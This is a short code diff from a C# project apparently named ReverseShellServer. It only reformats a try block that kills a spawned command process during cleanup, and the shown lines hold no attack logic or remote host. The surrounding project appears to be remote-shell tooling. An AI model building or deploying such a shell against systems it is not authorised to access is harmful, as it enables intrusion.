@@ -149,7 +149,10 @@ namespace ReverseShellServer
 
         void Cleanup()
         {
-            try { processCmd.Kill(); }
+            try
+            {
+                processCmd.Kill();
+            }
             catch (Exception)
             {
                 // ignored
